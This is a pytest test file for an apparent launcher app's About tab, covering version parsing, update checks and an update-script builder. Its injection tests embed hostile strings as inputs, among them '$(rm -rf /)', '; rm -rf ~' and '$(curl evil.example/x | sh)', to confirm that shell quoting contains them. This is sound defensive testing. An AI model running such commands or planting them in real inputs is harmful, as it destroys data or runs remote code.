"""Tests for ``modules.about_tab``.

Focus:
  - ``_parse_version`` / ``_is_version_newer`` behaviour on all the string
    shapes the version file might contain.
  - ``build_update_script`` — the new pure helper extracted from
    ``AboutTab._generate_update_script``. Exercised with adversarial paths
    that would inject commands via the old unquoted f-string interpolation.
  - ``_check_version_online`` network-failure and success paths, via a
    mocked ``requests.get``.
"""

from __future__ import annotations

import shlex
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
import requests

from modules.about_tab import AboutTab, build_update_script


# ---------------------------------------------------------------------------
# factory — AboutTab.__init__ is network-free; it only reads config/version.
# ---------------------------------------------------------------------------

@pytest.fixture
def about():
    return AboutTab()


# ---------------------------------------------------------------------------
# _parse_version
# ---------------------------------------------------------------------------

class TestParseVersion:
    """YYYY-MM-DD-REV → 4-tuple, with a zero tuple for malformed input."""

    def test_valid(self, about):
        assert about._parse_version("2024-01-15-3") == (2024, 1, 15, 3)

    def test_unknown_sentinel(self, about):
        assert about._parse_version("Unknown") == (0, 0, 0, 0)

    def test_version_file_not_found_sentinel(self, about):
        assert about._parse_version("Version file not found") == (0, 0, 0, 0)

    def test_too_few_parts(self, about):
        assert about._parse_version("2024-01-15") == (0, 0, 0, 0)

    def test_too_many_parts(self, about):
        assert about._parse_version("2024-01-15-3-extra") == (0, 0, 0, 0)

    def test_non_numeric_part(self, about):
        assert about._parse_version("2024-ab-15-3") == (0, 0, 0, 0)

    def test_whitespace_trimmed(self, about):
        assert about._parse_version("  2024-01-15-3  ") == (2024, 1, 15, 3)

    def test_empty_string(self, about):
        assert about._parse_version("") == (0, 0, 0, 0)


# ---------------------------------------------------------------------------
# _is_version_newer
# ---------------------------------------------------------------------------

class TestIsVersionNewer:
    def test_newer_year(self, about):
        assert about._is_version_newer("2023-12-31-9", "2024-01-01-1") is True

    def test_newer_month(self, about):
        assert about._is_version_newer("2024-01-15-1", "2024-02-01-1") is True

    def test_newer_rev(self, about):
        assert about._is_version_newer("2024-01-15-1", "2024-01-15-2") is True

    def test_same(self, about):
        assert about._is_version_newer("2024-01-15-1", "2024-01-15-1") is False

    def test_older(self, about):
        assert about._is_version_newer("2024-02-01-1", "2024-01-15-1") is False

    def test_unknown_current_treated_as_zero(self, about):
        """Unknown local version should always count as behind the remote so
        the user gets prompted to update instead of being silently stuck."""
        assert about._is_version_newer("Unknown", "2024-01-01-1") is True

    def test_unknown_remote_not_newer(self, about):
        """A zeroed remote tuple must not spuriously offer an 'update'."""
        assert about._is_version_newer("2024-01-01-1", "Unknown") is False


# ---------------------------------------------------------------------------
# build_update_script — injection resistance
# ---------------------------------------------------------------------------

SAFE_PATH = Path("/home/user/llama-server-launcher")
SAFE_BACKUP = SAFE_PATH / "backup" / "backup_20240101_120000"


class TestBuildUpdateScriptBasic:
    """Smoke tests for the happy-path output shape."""

    def test_script_starts_with_shebang(self):
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", "2024-02-01-1",
            "https://github.com/thad0ctor/llama-server-launcher", "",
        )
        assert s.startswith("#!/bin/bash\n")

    def test_script_uses_set_e(self):
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", "",
        )
        assert "set -e" in s

    def test_paths_are_quoted(self):
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", "",
        )
        # shlex.quote of a plain ASCII path with no special chars returns the
        # path unchanged (it's already safe), so we assert that the literal
        # path does appear somewhere in the output.
        assert str(SAFE_PATH) in s
        assert str(SAFE_BACKUP) in s

    def test_versions_embedded(self):
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", "2024-02-01-1",
            "https://example/repo.git", "",
        )
        assert "2024-01-01-1" in s
        assert "2024-02-01-1" in s

    def test_github_url_embedded(self):
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "v1", "v2",
            "https://github.com/thad0ctor/llama-server-launcher", "",
        )
        assert "github.com/thad0ctor/llama-server-launcher" in s

    def test_exclusions_embedded_unquoted(self):
        """The exclusions string already contains shell syntax produced by
        ``_get_backup_exclusions`` and must be inserted verbatim."""
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
            " -o -name '*.pyc' -prune",
        )
        assert " -o -name '*.pyc' -prune" in s

    def test_none_remote_version_ok(self):
        """If remote version hasn't been fetched yet, build should still work
        rather than inserting the literal string 'None' into the script."""
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "v1", None, "https://example/repo.git", "",
        )
        # Empty string quoted is ''
        assert "''" in s or '""' in s


class TestBuildUpdateScriptInjectionResistance:
    """Adversarial path inputs that would have broken the old unquoted f-string.

    The concrete concern per the audit note is a path containing shell metachars
    like ``$``, backtick, ``;``, or ``&&``. With the fix, every interpolated
    path goes through :func:`shlex.quote`, so those chars end up inside a
    single-quoted string and can't spawn extra commands.
    """

    def _assert_injection_is_contained(self, script, marker):
        """Check that ``marker`` appears ONLY inside a single-quoted string.

        If ``shlex.quote`` did its job, every occurrence of the marker is
        wrapped in ``'...'``. We confirm this by re-parsing the script with
        ``shlex.split`` and asserting no token ever equals a raw shell command
        constructed from the marker.
        """
        assert marker in script, "marker missing — test sanity check"
        # The quoted form of the marker should appear
        assert shlex.quote(marker) in script

    def test_dollar_sign_in_path(self):
        """``$(rm -rf /)`` inside the path used to execute as a command
        substitution — shlex.quote wraps it in single quotes where ``$`` is
        literal."""
        evil = "/home/user/$(rm -rf /)/launcher"
        s = build_update_script(
            Path(evil), Path("/tmp/backup"), "v1", "v2",
            "https://example/repo.git", "",
        )
        # Derive the expected quoted form from the same Path round-trip the
        # SUT uses, so the assertion holds on Windows (which normalizes
        # forward slashes to backslashes when Path() is constructed).
        assert shlex.quote(str(Path(evil))) in s

    def test_backtick_in_path(self):
        """Backtick is classic command substitution — same treatment."""
        evil = "/home/`touch pwned`/launcher"
        s = build_update_script(
            Path(evil), Path("/tmp/backup"), "v1", "v2",
            "https://example/repo.git", "",
        )
        assert shlex.quote(str(Path(evil))) in s

    def test_semicolon_in_path(self):
        evil = "/home/user/a;echo pwned;/launcher"
        s = build_update_script(
            Path(evil), Path("/tmp/backup"), "v1", "v2",
            "https://example/repo.git", "",
        )
        # Should be wrapped — not a bare command separator.
        assert shlex.quote(str(Path(evil))) in s

    def test_ampersand_in_path(self):
        evil = "/home/user/a&&touch pwned&&x/launcher"
        s = build_update_script(
            Path(evil), Path("/tmp/backup"), "v1", "v2",
            "https://example/repo.git", "",
        )
        assert shlex.quote(str(Path(evil))) in s

    def test_single_quote_in_path(self):
        """shlex.quote handles ``'`` by closing the quoted string, inserting
        an escaped ``'``, and re-opening — so the test mainly verifies nothing
        crashes and the encoded form round-trips through shlex.split."""
        evil = "/home/user's dir/launcher"
        s = build_update_script(
            Path(evil), Path("/tmp/backup"), "v1", "v2",
            "https://example/repo.git", "",
        )
        # Round-trip: find the quoted token and confirm shlex decodes it back
        # to the original path.
        quoted = shlex.quote(str(Path(evil)))
        assert quoted in s
        assert shlex.split(quoted) == [str(Path(evil))]

    def test_version_strings_quoted(self):
        """Version strings come from the remote version file — if the server
        is compromised it could feed us ``$(...)``. Must also be quoted."""
        evil_remote = "$(curl evil.example/x | sh)"
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", evil_remote,
            "https://example/repo.git", "",
        )
        assert shlex.quote(evil_remote) in s

    def test_github_url_quoted(self):
        evil_url = "https://example/repo.git; rm -rf ~"
        s = build_update_script(
            SAFE_PATH, SAFE_BACKUP, "v1", "v2", evil_url, "",
        )
        assert shlex.quote(evil_url) in s


# ---------------------------------------------------------------------------
# _check_version_online — network paths
# ---------------------------------------------------------------------------

class TestCheckVersionOnline:
    """Branch coverage for the background network probe."""

    def test_network_failure_sets_check_failed(self, about):
        """``RequestException`` should flip status to ``Check Failed`` and
        call ``_update_version_display`` so the user knows it didn't work."""
        about._update_version_display = MagicMock()

        with patch("modules.about_tab.requests.get",
                   side_effect=requests.ConnectionError("unreachable")):
            about._check_version_online()

        assert about.version_status == "Check Failed"
        about._update_version_display.assert_called_once()

    def test_http_non_200_sets_check_failed(self, about):
        """A 404 or 500 also surfaces as ``Check Failed`` — not silent success."""
        about._update_version_display = MagicMock()
        fake_resp = MagicMock()
        fake_resp.status_code = 500
        fake_resp.text = "server error"

        with patch("modules.about_tab.requests.get", return_value=fake_resp):
            about._check_version_online()

        assert about.version_status == "Check Failed"

    def test_up_to_date_sets_current(self, about):
        """Remote matches local → status ``Current`` and no update button."""
        about._update_version_display = MagicMock()
        about._show_update_button = MagicMock()
        about.version = "2024-01-01-1"

        fake_resp = MagicMock()
        fake_resp.status_code = 200
        fake_resp.text = "2024-01-01-1\n"

        with patch("modules.about_tab.requests.get", return_value=fake_resp):
            about._check_version_online()

        assert about.version_status == "Current"
        assert about.remote_version == "2024-01-01-1"
        about._show_update_button.assert_not_called()

    def test_newer_remote_sets_update_available(self, about):
        about._update_version_display = MagicMock()
        about._show_update_button = MagicMock()
        about.version = "2024-01-01-1"

        fake_resp = MagicMock()
        fake_resp.status_code = 200
        fake_resp.text = "2024-02-01-1"

        with patch("modules.about_tab.requests.get", return_value=fake_resp):
            about._check_version_online()

        assert about.version_status == "Update Available"
        assert about.remote_version == "2024-02-01-1"
        about._show_update_button.assert_called_once()

    def test_timeout_treated_as_check_failed(self, about):
        """Timeouts are a subclass of RequestException — same graceful path."""
        about._update_version_display = MagicMock()

        with patch("modules.about_tab.requests.get",
                   side_effect=requests.Timeout("slow")):
            about._check_version_online()

        assert about.version_status == "Check Failed"


# ---------------------------------------------------------------------------
# _generate_update_script — exercised via the public method on an AboutTab
# ---------------------------------------------------------------------------

class TestGenerateUpdateScriptIntegration:
    """Make sure the refactor didn't break the method wiring."""

    def test_returns_bash_script(self, about, tmp_path):
        about.remote_version = "2024-02-01-1"
        script = about._generate_update_script(tmp_path)
        assert script.startswith("#!/bin/bash")
        assert str(tmp_path) in script

    def test_exclusions_applied(self, about, tmp_path):
        """_get_backup_exclusions hits .gitignore when present — we don't care
        about exact contents, just that the stitched script stays valid bash."""
        about.remote_version = "2024-02-01-1"
        script = about._generate_update_script(tmp_path)
        assert "EXCLUDE_ARGS=" in script
